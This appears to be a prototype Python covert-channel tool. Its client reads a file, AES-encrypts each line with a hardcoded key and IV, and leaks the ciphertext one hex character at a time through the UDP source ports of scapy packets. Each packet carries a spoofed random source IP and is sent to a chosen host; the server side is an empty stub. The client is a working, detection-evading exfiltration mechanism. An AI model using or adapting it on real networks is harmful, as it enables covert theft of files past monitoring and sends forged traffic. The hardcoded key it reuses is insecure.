import socket
import getopt
import sys
from scapy.layers.inet import UDP, IP
from typing import Tuple
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from scapy.volatile import RandIP
from scapy.all import Raw, send

# ADDRESS & PORT are only modified in process_args()
ADDRESS = "127.0.0.1"
PORT = 8080

# Hardcoded key for encrypting/decrypting
# Not secure, but this is a prototype application using random text so its ok
key = b'\xac\x19\x08\xf8\x80uo\x0c5\xcb\x82_\xc9\xc0\xdc4Z=\xbf\x19\xf0O\xfa\x94\x0fW\x95\xaf=\xe9U\t'
iv = b'\xe4\xba\xa2\x06\xf2\xd6U\xef\x15\xcc\xdaY\x95\xf9\xb5;'

def main(mode, file):
    mode_str = "SERVER" if mode else "CLIENT"
    print("-----CONFIG-----")
    print(f"MODE: {mode_str}")
    print(f"FILE: {file}")
    print(f"ADDRESS: {ADDRESS}")
    print(f"PORT: {PORT}")
    print("----------------")
    if mode:
        server(file)
    else:
        client(file)

def server(file):
    pass


def client(file):
    lines = []
    with open(file, 'r') as f:
        while True:
            line = f.readline()
            if not line: break
            lines.append(line.strip())
    for line in lines:
        cipher = generate_cipher()
        encrypted_line = encrypt_line(cipher, line)
        hex_str = get_hex_string(encrypted_line)
        for item in hex_str:
            ascii_data = get_ascii(item)
            generate_packet(ascii_data)


def get_hex_string(encrypted_line):
    return encrypted_line.hex()


def generate_cipher() -> Cipher:
    return Cipher(algorithms.AES(key), modes.CBC(iv))


def encrypt_line(cipher, line) -> bytes:
    encryptor = cipher.encryptor()
    padder = padding.PKCS7(128).padder()
    padded_line = padder.update(line.encode()) + padder.finalize()
    encrypted_line = encryptor.update(padded_line) + encryptor.finalize()
    return encrypted_line


def generate_packet(data):
    src_ip = RandIP()
    ip = IP(src=src_ip, dst=ADDRESS)
    udp = UDP(sport=data, dport=PORT)
    pkt = ip/udp/Raw(b"X"*1024)
    send(pkt, verbose=0)


def get_ascii(hex_char) -> int:
    return ord(hex_char)


def usage():
    txt = """\nWelcome! Usage instructions can be seen below."""
    print(txt)
    print("-------------------------------------------")
    print("usage: python covert.py [options]")
    print("\t-h  --help   show usage")


def process_args(argv) -> Tuple[bool, str]:
    global ADDRESS
    global PORT
    SERVER_MODE = False
    try:
        opts, args = getopt.getopt(argv, "h", ["help", "server", "ip=", "port=", "file="])
    except getopt.GetoptError as err:
        # print help information and exit:
        print(err)  # will print something like "option -a not recognized"
        usage()
        sys.exit(2)
    for o, a in opts:
        if o in ("-h", "--help"):
            usage()
        elif o == "--server":
            SERVER_MODE = True
        elif o == "--ip":
            ADDRESS = a
        elif o == "--port":
            PORT = int(a)
        elif o == "--file":
            file = a
        else:
            assert False, "Unhandled option"
    return SERVER_MODE, file


if __name__ == "__main__":
    mode, file = process_args(sys.argv[1:])
    main(mode, file)
